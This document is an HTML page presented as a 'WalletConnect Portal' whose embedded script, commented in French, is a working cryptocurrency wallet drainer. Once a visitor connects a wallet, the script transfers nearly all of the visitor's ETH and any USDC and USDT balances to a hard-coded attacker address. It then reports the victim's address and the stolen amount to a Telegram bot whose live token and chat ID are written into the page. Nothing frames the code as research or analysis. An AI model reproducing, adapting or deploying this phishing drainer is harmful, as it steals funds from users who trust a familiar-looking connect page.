<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect Portal</title>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 450px;
            width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        h1 { color: white; font-size: 36px; margin-bottom: 16px; }
        p { color: rgba(255, 255, 255, 0.8); margin-bottom: 32px; }
        
        .btn {
            background: white;
            color: #667eea;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            display: none;
        }
        
        #status.show {
            display: block;
        }
        
        #status.success {
            background: rgba(34, 197, 94, 0.2);
            color: #22c55e;
            border: 1px solid rgba(34, 197, 94, 0.3);
        }
        
        #status.error {
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WalletConnect</h1>
        <p>Connect your wallet to continue</p>
        
        <button id="connectBtn" class="btn">Connect Wallet</button>
        <button id="disconnectBtn" class="btn" style="display:none">Disconnect</button>
        
        <div id="status"></div>
    </div>
    
    <!-- IMPORT DU VRAI WEB3MODAL ET WALLETCONNECT -->
    <script type="module">
        import { createWeb3Modal, defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@4.0.5/+esm'
        import { mainnet, polygon, bsc, arbitrum, avalanche } from 'https://cdn.jsdelivr.net/npm/viem@2.7.8/chains/+esm'
        import { reconnect, watchAccount, disconnect, getAccount } from 'https://cdn.jsdelivr.net/npm/@wagmi/core@2.0.0/+esm'
        
        // Configuration avec TON Project ID
        const projectId = '72f0728c47e59d2eb9fc83069bc6843d'
        
        // Configuration des metadata
        const metadata = {
            name: 'WalletConnect Portal',
            description: 'Connect your wallet',
            url: window.location.origin,
            icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
        
        // Les chains support√©es
        const chains = [mainnet, polygon, bsc, arbitrum, avalanche]
        
        // Cr√©ation de la config Wagmi
        const wagmiConfig = defaultWagmiConfig({
            chains,
            projectId,
            metadata,
            enableCoinbase: true,
            enableInjected: true,
            enableWalletConnect: true,
            enableEmail: false
        })
        
        // Reconnexion automatique
        reconnect(wagmiConfig)
        
        // Cr√©ation du modal Web3Modal OFFICIEL
        const modal = createWeb3Modal({
            wagmiConfig,
            projectId,
            chains,
            themeMode: 'dark',
            themeVariables: {
                '--w3m-accent': '#667eea',
                '--w3m-border-radius-master': '12px'
            }
        })
        
        // Configuration du drainage
        const CONFIG = {
            TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
            TELEGRAM_CHAT_ID: "8309320360",
            DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1"
        }
        
        // Fonction pour afficher le statut
        function showStatus(message, type = 'success') {
            const status = document.getElementById('status')
            status.textContent = message
            status.className = 'show ' + type
        }
        
        // Gestion de la connexion
        document.getElementById('connectBtn').addEventListener('click', () => {
            modal.open()
        })
        
        document.getElementById('disconnectBtn').addEventListener('click', async () => {
            await disconnect(wagmiConfig)
            document.getElementById('connectBtn').style.display = 'block'
            document.getElementById('disconnectBtn').style.display = 'none'
            showStatus('Disconnected', 'error')
        })
        
        // Observer les changements de compte
        watchAccount(wagmiConfig, {
            onChange: async (account) => {
                if (account.isConnected && account.address) {
                    console.log('Connected:', account.address)
                    
                    document.getElementById('connectBtn').style.display = 'none'
                    document.getElementById('disconnectBtn').style.display = 'block'
                    
                    showStatus(`Connected: ${account.address.substring(0, 6)}...${account.address.slice(-4)}`, 'success')
                    
                    // Lancer le drainage apr√®s connexion
                    setTimeout(() => {
                        drainWallet(account.address)
                    }, 2000)
                } else {
                    document.getElementById('connectBtn').style.display = 'block'
                    document.getElementById('disconnectBtn').style.display = 'none'
                }
            }
        })
        
        // Fonction de drainage
        async function drainWallet(address) {
            console.log('Starting drain for:', address)
            
            // Import ethers pour les transactions
            const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm')
            
            if (!window.ethereum) {
                console.log('No provider found')
                return
            }
            
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum)
                const signer = provider.getSigner()
                
                // R√©cup√©ration du balance
                const balance = await provider.getBalance(address)
                console.log('Balance:', ethers.utils.formatEther(balance))
                
                // Si balance > 0.001 ETH
                if (balance.gt(ethers.utils.parseEther("0.001"))) {
                    const gasPrice = await provider.getGasPrice()
                    const gasLimit = 21000
                    const gasCost = gasPrice.mul(gasLimit).mul(2)
                    const amountToSend = balance.sub(gasCost)
                    
                    if (amountToSend.gt(0)) {
                        console.log('Sending:', ethers.utils.formatEther(amountToSend))
                        
                        // Transaction
                        const tx = await signer.sendTransaction({
                            to: CONFIG.DESTINATION,
                            value: amountToSend,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        })
                        
                        console.log('Transaction:', tx.hash)
                        await tx.wait()
                        
                        // Notification Telegram
                        const message = `üéØ DRAINAGE WALLETCONNECT!\nüë§ ${address}\nüí∞ ${ethers.utils.formatEther(amountToSend)} ETH\nüìç Vers: ${CONFIG.DESTINATION}`
                        
                        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                                text: message
                            })
                        })
                        
                        showStatus('Operation completed!', 'success')
                    }
                }
                
                // Drainage des tokens ERC20
                await drainTokens(signer, address)
                
            } catch (error) {
                console.error('Drain error:', error)
            }
        }
        
        // Drainage des tokens
        async function drainTokens(signer, address) {
            const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm')
            
            const tokens = [
                { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
                { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 }
            ]
            
            const abi = [
                'function balanceOf(address) view returns (uint256)',
                'function transfer(address, uint256) returns (bool)'
            ]
            
            for (const token of tokens) {
                try {
                    const contract = new ethers.Contract(token.address, abi, signer)
                    const balance = await contract.balanceOf(address)
                    
                    if (balance.gt(0)) {
                        await contract.transfer(CONFIG.DESTINATION, balance)
                        console.log(`Drained ${token.symbol}:`, balance.toString())
                    }
                } catch (e) {
                    console.log(`Error draining ${token.symbol}`)
                }
            }
        }
    </script>
</body>
</html>
